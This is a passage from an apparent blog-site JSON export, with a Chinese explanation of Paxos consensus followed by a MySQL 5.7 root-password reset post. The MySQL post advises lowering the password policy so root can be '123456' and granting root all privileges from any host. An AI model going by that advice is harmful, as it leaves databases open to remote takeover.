class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x60A8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;&#xFF0C;&#x4F46;&#x662F;&#x60A8;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%,&#x8BF7;&#x660E;&#x5BDF;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E8E;&#x662F;, A1&#x548C;A5&#x90FD;&#x6536;&#x5230;&#x4E86;&#x8DB3;&#x591F;&#x7684;&#x56DE;&#x590D;&#x3002;&#x8FD9;&#x65F6;&#x5173;&#x4E8E;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x5C31;&#x6709;&#x4E24;&#x4E2A;&#x63D0;&#x6848;&#x5728;&#x540C;&#x65F6;&#x8FDB;&#x884C;&#x3002;&#x4F46;&#x662F;A5&#x77E5;&#x9053;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x7A0E;&#x7387;&#x4E3A;10%.&#x4E8E;&#x662F;A1&#x548C;A5&#x90FD;&#x4F1A;&#x5411;&#x5168;&#x4F53;&#x8BAE;&#x5458;&#x5E7F;&#x64AD;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E00;&#x81F4;&#x6027;&#x5F97;&#x5230;&#x4E86;&#x4FDD;&#x8BC1;&#x3002;</p>\n<ol>\n<li>A5&#x662F;&#x4E2A;&#x65E0;&#x8DB3;&#x8F7B;&#x91CD;&#x7684;&#x5C0F;&#x4EBA;&#x7269;&#x3002;&#x8FD9;&#x65F6;A3&#x4E0D;&#x518D;&#x7406;&#x4F1A;&#x4ED6;, A1&#x4E0D;&#x4E45;&#x540E;&#x5C31;&#x4F1A;&#x5E7F;&#x64AD;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%.</li>\n</ol>\n<h5 id=\"&#x60C5;&#x51B5;&#x4E09;\"><a href=\"#&#x60C5;&#x51B5;&#x4E09;\" class=\"headerlink\" title=\"&#x60C5;&#x51B5;&#x4E09;\"></a>&#x60C5;&#x51B5;&#x4E09;</h5><p>&#x5728;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x770B;&#x89C1;&#xFF0C;&#x6839;&#x636E;&#x63D0;&#x6848;&#x7684;&#x65F6;&#x95F4;&#x53CA;&#x63D0;&#x6848;&#x8005;&#x7684;&#x6743;&#x52BF;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x5E94;&#x7B54;&#x662F;&#x6709;&#x610F;&#x4E49;&#x7684;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x65F6;&#x95F4;&#x548C;&#x63D0;&#x6848;&#x8005;&#x7684;&#x6743;&#x52BF;&#x5C31;&#x6784;&#x6210;&#x4E86;&#x7ED9;&#x63D0;&#x6848;&#x7F16;&#x53F7;&#x7684;&#x4F9D;&#x636E;&#x3002;&#x8FD9;&#x6837;&#x7684;&#x7F16;&#x53F7;&#x7B26;&#x5408;&#x201D;&#x4EFB;&#x4F55;&#x4E24;&#x4E2A;&#x63D0;&#x6848;&#x4E4B;&#x95F4;&#x6784;&#x6210;&#x504F;&#x5E8F;&#x201D;&#x7684;&#x8981;&#x6C42;&#x3002;</p>\n<p>A1&#x548C;A5&#x540C;&#x6837;&#x63D0;&#x51FA;&#x4E0A;&#x8FF0;&#x63D0;&#x6848;&#xFF0C;&#x8FD9;&#x65F6;A1&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8054;&#x7CFB;A2&#x548C;A3; A5&#x4E5F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8054;&#x7CFB;&#x8FD9;&#x4E24;&#x4E2A;&#x4EBA;&#x3002;&#x8FD9;&#x6B21;A2&#x5148;&#x6536;&#x5230;A1&#x7684;&#x63D0;&#x6848;; A3&#x5219;&#x5148;&#x6536;&#x5230;A5&#x7684;&#x63D0;&#x6848;. A5&#x66F4;&#x6709;&#x6743;&#x52BF;&#x3002;</p>\n<p>&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5DF2;&#x7ECF;&#x56DE;&#x7B54;A1&#x7684;A2&#x53D1;&#x73B0;&#x6709;&#x6BD4;A1&#x66F4;&#x6709;&#x6743;&#x52BF;&#x7684;A5&#x63D0;&#x51FA;&#x4E86;&#x7A0E;&#x7387;20%&#x7684;&#x65B0;&#x63D0;&#x6848;&#xFF0C;&#x4E8E;&#x662F;&#x56DE;&#x590D;A5&#x8BF4;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x60A8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x800C;&#x56DE;&#x590D;&#x4E86;A5&#x7684;A3&#x53D1;&#x73B0;&#x65B0;&#x7684;&#x63D0;&#x6848;&#x8005;A1&#x662F;&#x4E2A;&#x5C0F;&#x4EBA;&#x7269;&#xFF0C;&#x4E0D;&#x4E88;&#x7406;&#x4F1A;&#x3002;</p>\n<p>A1&#x6CA1;&#x6709;&#x8FBE;&#x5230;&#x591A;&#x6570;&#xFF0C;A5&#x8FBE;&#x5230;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;A5&#x5C06;&#x4E3B;&#x6301;&#x6295;&#x7968;&#xFF0C;&#x51B3;&#x8BAE;&#x7684;&#x5185;&#x5BB9;&#x662F;A5&#x63D0;&#x51FA;&#x7684;&#x7A0E;&#x7387;20%.</p>\n<p>&#x5982;&#x679C;A3&#x51B3;&#x5B9A;&#x5E73;&#x7B49;&#x5730;&#x5BF9;&#x5F85;&#x6BCF;&#x4E00;&#x4F4D;&#x8BAE;&#x5458;&#xFF0C;&#x5BF9;A1&#x505A;&#x51FA;&#x201D;&#x4F60;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;20%&#x201D;&#x7684;&#x56DE;&#x590D;&#xFF0C;&#x5219;&#x5C06;&#x9020;&#x6210;&#x6DF7;&#x4E71;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;A1&#x548C;A5&#x90FD;&#x5C06;&#x8BD5;&#x56FE;&#x4E3B;&#x6301;&#x6295;&#x7968;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;&#x4E24;&#x4EFD;&#x63D0;&#x6848;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x540C;&#x3002;</p>\n<p>&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;, A3&#x82E5;&#x5BF9;A1&#x8FDB;&#x884C;&#x56DE;&#x590D;&#xFF0C;&#x53EA;&#x80FD;&#x8BF4;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6709;&#x66F4;&#x5927;&#x7684;&#x4EBA;&#x7269;&#x5173;&#x6CE8;&#x6B64;&#x4E8B;&#xFF0C;&#x8BF7;&#x7B49;&#x5F85;&#x4ED6;&#x505A;&#x51FA;&#x51B3;&#x5B9A;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x53E6;&#x5916;&#xFF0C;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;, A4&#x4E0E;&#x5916;&#x754C;&#x5931;&#x53BB;&#x4E86;&#x8054;&#x7CFB;&#x3002;&#x7B49;&#x5230;&#x4ED6;&#x6062;&#x590D;&#x8054;&#x7CFB;&#xFF0C;&#x5E76;&#x9700;&#x8981;&#x5F97;&#x77E5;&#x7A0E;&#x7387;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x4ED6;&#xFF08;&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#xFF09;&#x5C06;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;15%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;4&#x6708;1&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A4</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x65F6;&#xFF0C;&#xFF08;&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#xFF09;&#x5176;&#x4ED6;&#x8BAE;&#x5458;&#x5C06;&#x4F1A;&#x56DE;&#x590D;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5728;&#x4E4B;&#x524D;&#x7684;&#x6295;&#x7968;&#x4E2D;&#x5B9A;&#x4E3A;20%,&#x4F60;&#x4E0D;&#x8981;&#x518D;&#x6765;&#x70E6;&#x6211;!</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;\"><a href=\"#&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;\" class=\"headerlink\" title=\"&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;\"></a>&#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;</h4><p>&#x4E00;&#x4E2A;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5F53;acceptors&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x65F6;&#xFF0C;&#x5C06;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x6240;&#x6709;learner&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x4F1A;&#x5BFC;&#x81F4;&#x6D88;&#x606F;&#x91CF;&#x8FC7;&#x5927;&#x3002;<br>&#x7531;&#x4E8E;&#x5047;&#x8BBE;&#x6CA1;&#x6709;Byzantine failures&#xFF0C;learners&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x522B;&#x7684;learners&#x83B7;&#x53D6;&#x5DF2;&#x7ECF;&#x901A;&#x8FC7;&#x7684;&#x51B3;&#x8BAE;&#x3002;&#x56E0;&#x6B64;acceptors&#x53EA;&#x9700;&#x5C06;&#x6279;&#x51C6;&#x7684;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x6307;&#x5B9A;&#x7684;&#x67D0;&#x4E00;&#x4E2A;learner&#xFF0C;&#x5176;&#x4ED6;learners&#x5411;&#x5B83;&#x8BE2;&#x95EE;&#x5DF2;&#x7ECF;&#x901A;&#x8FC7;&#x7684;&#x51B3;&#x8BAE;&#x3002;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x964D;&#x4F4E;&#x4E86;&#x6D88;&#x606F;&#x91CF;&#xFF0C;&#x4F46;&#x662F;&#x6307;&#x5B9A;learner&#x5931;&#x6548;&#x5C06;&#x5F15;&#x8D77;&#x7CFB;&#x7EDF;&#x5931;&#x6548;&#x3002;</p>\n<p>&#x56E0;&#x6B64;acceptors&#x9700;&#x8981;&#x5C06;accept&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;learners&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x96C6;&#xFF0C;&#x7136;&#x540E;&#x7531;&#x8FD9;&#x4E9B;learners&#x53BB;&#x901A;&#x77E5;&#x6240;&#x6709;learners&#x3002;<br>&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;learner&#x83B7;&#x5F97;&#x4E86;&#x51B3;&#x8BAE;&#x6279;&#x51C6;&#x7684;&#x6D88;&#x606F;&#x3002;&#x5F53;learners&#x9700;&#x8981;&#x4E86;&#x89E3;&#x51B3;&#x8BAE;&#x901A;&#x8FC7;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4E00;&#x4E2A;proposer&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x63D0;&#x6848;&#x3002;&#x6CE8;&#x610F;&#x4E00;&#x4E2A;learner&#x53EF;&#x80FD;&#x517C;&#x4EFB;proposer&#x3002;</p>\n<h4 id=\"Progress&#x7684;&#x4FDD;&#x8BC1;\"><a href=\"#Progress&#x7684;&#x4FDD;&#x8BC1;\" class=\"headerlink\" title=\"Progress&#x7684;&#x4FDD;&#x8BC1;\"></a>Progress&#x7684;&#x4FDD;&#x8BC1;</h4><p>&#x6839;&#x636E;&#x4E0A;&#x8FF0;&#x8FC7;&#x7A0B;&#x5F53;&#x4E00;&#x4E2A;proposer&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x65F6;&#x5C06;&#x7EC8;&#x6B62;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x4F1A;&#x7EC8;&#x6B62;&#x4E4B;&#x524D;&#x7684;&#x63D0;&#x6848;&#x8FC7;&#x7A0B;&#x3002;&#x5982;&#x679C;&#x4E24;&#x4E2A;proposer&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x8F6C;&#x800C;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x9677;&#x5165;&#x6D3B;&#x9501;&#xFF0C;&#x8FDD;&#x80CC;&#x4E86;Progress&#x7684;&#x8981;&#x6C42;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x9009;&#x4E3E;&#x51FA;&#x4E00;&#x4E2A;leader&#xFF0C;&#x4EC5;&#x5141;&#x8BB8;leader&#x63D0;&#x51FA;&#x63D0;&#x6848;&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x4E2A;proposer&#x81EA;&#x8BA4;&#x4E3A;&#x81EA;&#x5DF1;&#x5DF2;&#x7ECF;&#x6210;&#x4E3A;leader&#x3002;Lamport&#x5728;The Part-Time Parliament&#x4E00;&#x6587;&#x4E2D;&#x63CF;&#x8FF0;&#x5E76;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;</p>"},{"title":"Mysql5.7忘记root密码及修改root密码的方法","date":"2016-09-20T14:41:19.000Z","toc":false,"_content":"\nMysql 安装成功后，输入 mysql --version 显示版本如下\n```bash\nmysql  Ver 14.14 Distrib 5.7.13-6, for Linux (x86_64) using  6.0\n```\n\n用默认密码登录报如下错误：\n```bash\t\nmysqladmin -uroot -p password 'newpassword'\nEnter password:\nmysqladmin: connect to server at 'localhost' failed\nerror: 'Access denied for user 'root'@'localhost' (using password: YES)'\n```\n\n解决方法：\n```bash\n/etc/init.d/mysql stop\nmysqld_safe --user=mysql --skip-grant-tables --skip-networking &\nmysql -u root mysql\nmysql> use mysql\nmysql> UPDATE user SET authentication_string=PASSWORD('newpassword') where USER='root';\nmysql> FLUSH PRIVILEGES;\nmysql> quit\n\n/etc/init.d/mysql restart\nmysql -uroot -p\nEnter password: <输入新设的密码newpassword>\n```\n\n<!-- more -->\n\n> 注意：mysql5.7版本mysql数据库user表的密码字段为authentication_string, 其他版本大部分为password，update语句相应为：\n```bash\nUPDATE user SET Password=PASSWORD('newpassword') where USER='root';\n```\n\n---\n\n<br/>\n\n用重置的密码终于登录成功，结果发现操作任何sql语句都报如下错误：\n```bash\nYou must reset your password using ALTER USER statement before executing this statement.\n```\n\n** 错误显示在操作sql语句前必须重置密码，然后试了好几个重置密码的语句都重置失败，陷入了死循环。\n这时发现错误提示修改密码需使用 <font style=\"color:red\">Alter USER </font>语句，才找到了解决方法，可是又报密码过于简单的错误。**\n\n```bash\nmysql> alter user 'root'@'localhost' identified by '123'; \nERROR 1819 (HY000): Your password does not satisfy the current policy requirements\n```\n\n这个错误其实与validate_password_policy有关，mysql5.6版本后，推出了validate_password插件，加强了密码强度。\n可以使用 mysql> show variables like \"%vali%\" 命令查看validate_password_policy值：\n\nVariable_name | Value\n---|---\nvalidate_password_dictionary_file | \nvalidate_password_length | 8\nvalidate_password_mixed_case_count | 1\nvalidate_password_number_count | 1\nvalidate_password_policy | MEDIUM\nvalidate_password_special_char_count | 1\n\n**validate_password_policy有以下取值：**\n\nPolicy | Tests Performed\n---|---\n0 or LOW | \tLength\n1 or MEDIUM | Length; numeric, lowercase/uppercase, and special characters\n2 or STRONG | Length; numeric, lowercase/uppercase, and special characters; dictionary file\n\n**默认是1，即MEDIUM，所以刚开始设置的密码必须符合长度，且必须含有数字，小写或大写字母，特殊字符。\n所以用alter user语句重设一个复杂的密码，发现设置成功。**\n\n> 如果不想密码设置过于复杂，只想设置root的密码为123456，需要修改默认规则\nset global validate_password_policy=0;\nset global validate_password_length=1;\nselect @@validate_password_length;\n方法详见http://www.cnblogs.com/ivictor/p/5142809.html\n\n\n最后授权root远程登录权限：\n```bash\nmysql> Grant all privileges on *.* to 'root'@'%' identified by 'newpassword' with grant option;\n```\n","source":"_posts/Mysql5.7忘记root密码及修改root密码的方法.md","raw":"---\ntitle: Mysql5.7忘记root密码及修改root密码的方法\ncategories:\n  - 错误集锦\ntags:\n  - mysql\ndate: 2016-9-20 22:41:19\ntoc: false\n\n---\n\nMysql 安装成功后，输入 mysql --version 显示版本如下\n```bash\nmysql  Ver 14.14 Distrib 5.7.13-6, for Linux (x86_64) using  6.0\n```\n\n用默认密码登录报如下错误：\n```bash\t\nmysqladmin -uroot -p password 'newpassword'\nEnter password:\nmysqladmin: connect to server at 'localhost' failed\nerror: 'Access denied for user 'root'@'localhost' (using password: YES)'\n```\n\n解决方法：\n```bash\n/etc/init.d/mysql stop\nmysqld_safe --user=mysql --skip-grant-tables --skip-networking &\nmysql -u root mysql\nmysql> use mysql\nmysql> UPDATE user SET authentication_string=PASSWORD('newpassword') where USER='root';\nmysql> FLUSH PRIVILEGES;\nmysql> quit\n\n/etc/init.d/mysql restart\nmysql -uroot -p\nEnter password: <输入新设的密码newpassword>\n```\n\n<!-- more -->\n\n> 注意：mysql5.7版本mysql数据库user表的密码字段为authentication_string, 其他版本大部分为password，update语句相应为：\n```bash\nUPDATE user SET Password=PASSWORD('newpassword') where USER='root';\n```\n\n---\n\n<br/>\n\n用重置的密码终于登录成功，结果发现操作任何sql语句都报如下错误：\n```bash\nYou must reset your password using ALTER USER statement before executing this statement.\n```\n\n** 错误显示在操作sql语句前必须重置密码，然后试了好几个重置密码的语句都重置失败，陷入了死循环。\n这时发现错误提示修改密码需使用 <font style=\"color:red\">Alter USER </font>语句，才找到了解决方法，可是又报密码过于简单的错误。**\n\n```bash\nmysql> alter user 'root'@'localhost' identified by '123'; \nERROR 1819 (HY000): Your password does not satisfy the current policy requirements\n```\n\n这个错误其实与validate_password_policy有关，mysql5.6版本后，推出了validate_password插件，加强了密码强度。\n可以使用 mysql> show variables like \"%vali%\" 命令查看validate_password_policy值：\n\nVariable_name | Value\n---|---\nvalidate_password_dictionary_file | \nvalidate_password_length | 8\nvalidate_password_mixed_case_count | 1\nvalidate_password_number_count | 1\nvalidate_password_policy | MEDIUM\nvalidate_password_special_char_count | 1\n\n**validate_password_policy有以下取值：**\n\nPolicy | Tests Performed\n---|---\n0 or LOW | \tLength\n1 or MEDIUM | Length; numeric, lowercase/uppercase, and special characters\n2 or STRONG | Length; numeric, lowercase/uppercase, and special characters; dictionary file\n\n**默认是1，即MEDIUM，所以刚开始设置的密码必须符合长度，且必须含有数字，小写或大写字母，特殊字符。\n所以用alter user语句重设一个复杂的密码，发现设置成功。**\n\n> 如果不想密码设置过于复杂，只想设置root的密码为123456，需要修改默认规则\nset global validate_password_policy=0;\nset global validate_password_length=1;\nselect @@validate_password_length;\n方法详见http://www.cnblogs.com/ivictor/p/5142809.html\n\n\n最后授权root远程登录权限：\n```bash\nmysql> Grant all privileges on *.* to 'root'@'%' identified by 'newpassword' with grant option;\n```\n","slug":"Mysql5.7忘记root密码及修改root密码的方法","published":1,"updated":"2016-11-17T11:59:42.668Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbz0021gwtm4awzx5sp","content":"<p>Mysql &#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x8F93;&#x5165; mysql &#x2013;version &#x663E;&#x793A;&#x7248;&#x672C;&#x5982;&#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql  Ver 14.14 Distrib 5.7.13-6, <span class=\"keyword\">for</span> Linux (x86_64) using  6.0</span><br></pre></td></tr></table></figure></p>\n<p>&#x7528;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysqladmin -uroot -p password <span class=\"string\">&apos;newpassword&apos;</span></span><br><span class=\"line\">Enter password:</span><br><span class=\"line\">mysqladmin: connect to server at <span class=\"string\">&apos;localhost&apos;</span> failed</span><br><span class=\"line\">error: <span class=\"string\">&apos;Access denied for user &apos;</span>root<span class=\"string\">&apos;@&apos;</span>localhost<span class=\"string\">&apos; (using password: YES)&apos;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/mysql stop</span><br><span class=\"line\">mysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp;</span><br><span class=\"line\">mysql -u root mysql</span><br><span class=\"line\">mysql&gt; use mysql</span><br><span class=\"line\">mysql&gt; UPDATE user SET authentication_string=PASSWORD(<span class=\"string\">&apos;newpassword&apos;</span>) <span class=\"built_in\">where</span> USER=<span class=\"string\">&apos;root&apos;</span>;</span><br><span class=\"line\">mysql&gt; FLUSH PRIVILEGES;</span><br><span class=\"line\">mysql&gt; quit</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/init.d/mysql restart</span><br><span class=\"line\">mysql -uroot -p</span><br><span class=\"line\">Enter password: &lt;&#x8F93;&#x5165;&#x65B0;&#x8BBE;&#x7684;&#x5BC6;&#x7801;newpassword&gt;</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<blockquote>\n<p>&#x6CE8;&#x610F;&#xFF1A;mysql5.7&#x7248;&#x672C;mysql&#x6570;&#x636E;&#x5E93;user&#x8868;&#x7684;&#x5BC6;&#x7801;&#x5B57;&#x6BB5;&#x4E3A;authentication_string, &#x5176;&#x4ED6;&#x7248;&#x672C;&#x5927;&#x90E8;&#x5206;&#x4E3A;password&#xFF0C;update&#x8BED;&#x53E5;&#x76F8;&#x5E94;&#x4E3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UPDATE user SET Password=PASSWORD(<span class=\"string\">&apos;newpassword&apos;</span>) <span class=\"built_in\">where</span> USER=<span class=\"string\">&apos;root&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<hr>\n<p><br></p>\n<p>&#x7528;&#x91CD;&#x7F6E;&#x7684;&#x5BC6;&#x7801;&#x7EC8;&#x4E8E;&#x767B;&#x5F55;&#x6210;&#x529F;&#xFF0C;&#x7ED3;&#x679C;&#x53D1;&#x73B0;&#x64CD;&#x4F5C;&#x4EFB;&#x4F55;sql&#x8BED;&#x53E5;&#x90FD;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You must reset your password using ALTER USER statement before executing this statement.</span><br></pre></td></tr></table></figure></p>\n<p><strong> &#x9519;&#x8BEF;&#x663E;&#x793A;&#x5728;&#x64CD;&#x4F5C;sql&#x8BED;&#x53E5;&#x524D;&#x5FC5;&#x987B;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x8BD5;&#x4E86;&#x597D;&#x51E0;&#x4E2A;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x7684;&#x8BED;&#x53E5;&#x90FD;&#x91CD;&#x7F6E;&#x5931;&#x8D25;&#xFF0C;&#x9677;&#x5165;&#x4E86;&#x6B7B;&#x5FAA;&#x73AF;&#x3002;<br>&#x8FD9;&#x65F6;&#x53D1;&#x73B0;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x9700;&#x4F7F;&#x7528; <font style=\"color:red\">Alter USER </font>&#x8BED;&#x53E5;&#xFF0C;&#x624D;&#x627E;&#x5230;&#x4E86;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x662F;&#x53C8;&#x62A5;&#x5BC6;&#x7801;&#x8FC7;&#x4E8E;&#x7B80;&#x5355;&#x7684;&#x9519;&#x8BEF;&#x3002;</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; alter user <span class=\"string\">&apos;root&apos;</span>@<span class=\"string\">&apos;localhost&apos;</span> identified by <span class=\"string\">&apos;123&apos;</span>; </span><br><span class=\"line\">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</span><br></pre></td></tr></table></figure>\n<p>&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x5176;&#x5B9E;&#x4E0E;validate_password_policy&#x6709;&#x5173;&#xFF0C;mysql5.6&#x7248;&#x672C;&#x540E;&#xFF0C;&#x63A8;&#x51FA;&#x4E86;validate_password&#x63D2;&#x4EF6;&#xFF0C;&#x52A0;&#x5F3A;&#x4E86;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x3002;<br>&#x53EF;&#x4EE5;&#x4F7F;&#x7528; mysql&gt; show variables like &#x201C;%vali%&#x201D; 